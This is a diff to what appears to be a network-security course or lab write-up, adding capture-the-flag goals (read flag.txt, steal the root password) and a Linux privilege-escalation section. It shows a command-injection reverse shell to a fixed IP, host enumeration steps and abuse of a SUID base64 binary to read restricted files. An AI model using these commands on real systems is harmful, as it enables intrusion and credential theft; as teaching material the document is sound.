@@ -1,5 +1,9 @@
 # Network Security DSP
 
+### Goals
+* Read the file "flag.txt"
+* Steal the root password
+
 ## Man In The Middle
 
 ## Cookie Stealing and Hijacking Session
@@ -84,6 +88,65 @@ Thanks to command injection, we can open a remote shell on our attacking machine
 * **bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"**
 
 In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the -c flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.
+
 ## Privilege Escalation
+At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
+
+It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
+* Execute any administrative command
+* Resettings passwords
+* Editing software configurations
+* Bypassing access controls to compromise protected data
+* Enabling persistence
+* Changing the privilege of existing (or new) users
+
+Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or, in this case, just found a way to send commands using a low privileged account.
+
+Shown below are some of the possible ways to get system information.
+
+* ### uname -a
+Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation
+
+* ### /proc/version
+Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
+
+* ### ps Command
+The **ps** command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 
+
+* ### env
+The env command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
+
+* ### sudo -l
+The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.
+
+* ### id
+The id command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.
+
+* ### /etc/passwd
+Reading the /etc/passwd file can be an easy way to discover users on the system. 
+
+* ### ifconfig
+The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 
+
+* ### netstat
+Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections. 
+
+* ### find Command
+Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
+
+### SUID
+Much of Linux's privilege checks rely on checking users and file interactions. This is done with permissions. By now you know that files can have read, write and execute permissions. These are provided to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow you to run files with the permission level of the file owner or group owner, respectively.
+
+You will notice these files have an “s” bit set showing their special permission level.
+
+**find / -type f -perm -04000 -ls 2>/dev/null** will list files that have SUID or SGID bits set.
+
+A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
+
+We can notice that **base64** command has the bit **s** set. As you can read at the following link:
+* https://gtfobins.github.io/gtfobins/base64/#suid
+
+Thanks to this, it is possible to read files on which the admin user doesn't have access permissions by running:
+* **base64 file | base64 -d**
 
 ## Cracking Password
